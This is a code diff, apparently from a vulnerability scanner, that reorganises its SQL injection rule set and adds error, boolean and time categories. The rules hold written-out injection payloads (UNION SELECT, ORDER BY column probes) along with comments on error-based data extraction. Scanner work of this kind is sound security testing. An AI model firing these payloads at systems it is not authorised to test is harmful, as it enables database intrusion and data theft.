@@ -19,10 +19,12 @@ _BOOLEAN_AND_FALSE_TEMPLATES = [
 ]
 
 SQLI_RULES: list[dict] = [
+    # error: 에러 기반 (DB 에러 메시지 노출로 판정)
     {
         "attack_id": "PL-SQLI-ERROR-META",
         "vuln_type": "sqli",
         "technique": "error_meta",
+        "category": "error",
         "sequence": ["baseline", "attack"],
         "payload_templates": {
             "attack": [
@@ -38,12 +40,48 @@ SQLI_RULES: list[dict] = [
         },
     },
     {
-        # AND/OR 스타일을 한 family로 통합 — 두 스타일이 false_attack(6개)과 와일드카드(3개)를
-        # 완전히 동일하게 공유했던 걸 그대로 두면 family당 요청이 이중으로 나가서 하나로 합침.
-        # _analyze_boolean은 true/false 방향을 이미 무관하게 처리하므로 판정 로직 변경은 불필요.
+        # UNION — 컬럼 수 불일치 시 "column count doesn't match" 에러를 유발,
+        # judge_union_sqli 가 그 에러 시그니처로 판정하므로 error 계열.
+        "attack_id": "PL-SQLI-UNION",
+        "vuln_type": "sqli",
+        "technique": "union",
+        "category": "error",
+        "sequence": ["baseline", "attack"],
+        "payload_templates": {
+            "attack": [
+                "{value} UNION ALL SELECT NULL -- ",
+                "{value}' UNION ALL SELECT NULL -- ",
+                '{value}" UNION ALL SELECT NULL -- ',
+                "{value}) UNION ALL SELECT NULL -- ",
+                "{value}') UNION ALL SELECT NULL -- ",
+                '{value}") UNION ALL SELECT NULL -- ',
+            ],
+        },
+    },
+    {
+        "attack_id": "PL-SQLI-ORDERBY",
+        "vuln_type": "sqli",
+        "technique": "order_by",
+        "category": "error",
+        "sequence": ["baseline", "attack"],
+
+        "payload_templates": {
+            "attack": [
+                "{value} ORDER BY 100-- ",
+                "{value}' ORDER BY 100-- ",
+                '{value}" ORDER BY 100-- ',
+                "{value} ORDER BY 9999-- ",
+                "{value}' ORDER BY 9999-- ",
+                '{value}" ORDER BY 9999-- ',
+            ],
+        },
+    },
+    # boolean: 불리언 블라인드 (참/거짓 응답 차이로 판정)
+    {
         "attack_id": "PL-SQLI-BOOLEAN",
         "vuln_type": "sqli",
         "technique": "boolean",
+        "category": "boolean",
         "sequence": ["baseline", "true_attack", "false_attack"],
         "payload_templates": {
             "true_attack": [
@@ -69,42 +107,7 @@ SQLI_RULES: list[dict] = [
             "false_attack": _BOOLEAN_AND_FALSE_TEMPLATES,
         },
     },
-    {
-        "attack_id": "PL-SQLI-UNION",
-        "vuln_type": "sqli",
-        "technique": "union",
-        "sequence": ["baseline", "attack"],
-        "payload_templates": {
-            "attack": [
-                "{value} UNION ALL SELECT NULL -- ",
-                "{value}' UNION ALL SELECT NULL -- ",
-                '{value}" UNION ALL SELECT NULL -- ',
-                "{value}) UNION ALL SELECT NULL -- ",
-                "{value}') UNION ALL SELECT NULL -- ",
-                '{value}") UNION ALL SELECT NULL -- ',
-            ],
-        },
-    },
-    {
-        "attack_id": "PL-SQLI-ORDERBY",
-        "vuln_type": "sqli",
-        "technique": "order_by",
-        "sequence": ["baseline", "attack"],
-        # ORDER BY 절 주입 → 컬럼 수보다 큰 번호로 정렬 시 DB가
-        # "Unknown column '100' in 'order clause'" 에러를 확정적으로 노출.
-        # (ORDER BY 1 처럼 유효한 번호는 에러 없이 정렬만 되므로 반드시 큰 수)
-        # 판정은 analyzer 의 judge_error_based_sqli(DB 에러 시그니처)로 낙하.
-        "payload_templates": {
-            "attack": [
-                "{value} ORDER BY 100-- ",
-                "{value}' ORDER BY 100-- ",
-                '{value}" ORDER BY 100-- ',
-                "{value} ORDER BY 9999-- ",
-                "{value}' ORDER BY 9999-- ",
-                '{value}" ORDER BY 9999-- ',
-            ],
-        },
-    },
+    # time: 시간 기반 블라인드 (sleep 지연으로 판정)
     {
         # 진짜 Error-based — extractvalue/updatexml로 값을 XPATH 에러에 실어 노출(컬럼 수 무관).
         # 값을 마커(0x7e7e = "~~")로 감싸 서진 judge가 응답 본문에서 ~~값~~ 로 추출 → 정보추출 판정.
@@ -133,6 +136,7 @@ SQLI_RULES: list[dict] = [
         "attack_id": "PL-SQLI-TIME-MYSQL",
         "vuln_type": "sqli",
         "technique": "time_mysql",
+        "category": "time",
         "sequence": ["baseline", "attack"],
         "payload_templates": {
             "attack": [
